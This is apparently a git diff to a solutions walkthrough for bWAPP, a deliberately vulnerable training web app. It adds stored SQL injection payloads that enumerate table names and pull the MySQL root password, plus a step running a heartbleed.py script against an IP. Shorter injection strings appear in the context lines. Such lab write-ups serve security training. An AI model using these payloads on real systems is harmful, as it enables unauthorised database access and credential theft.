@@ -104,6 +104,23 @@ ok' or 1=1--
 a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
 ```
 
+### SQL Injection - Stored (Blog)
+
+Be sure to add a space after the -- for this one, otherwise the injection will not work
+```
+asdf',(SELECT database()  ))-- 
+```
+
+To begin enumerating tables:
+```
+asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))-- 
+asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 1,1  ))-- 
+```
+
+```
+asdf',(select password from mysql.user where user='root' ))-- 
+```
+
 # A2 - Broken Authentication
 
 ### Broken Auth. - CAPTCHA Bypassing
@@ -223,6 +240,16 @@ xmlhttp.send();
 Use Burp to get cookie
 
 ![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)
+
+### Heartbleed Vulnerability
+
+Use the heartbleed.py script found in the /evil directory
+
+```
+python heartbleed.py [ip] 
+```
+
+
 
 # A7 - Missing Functional Level Access Control
 
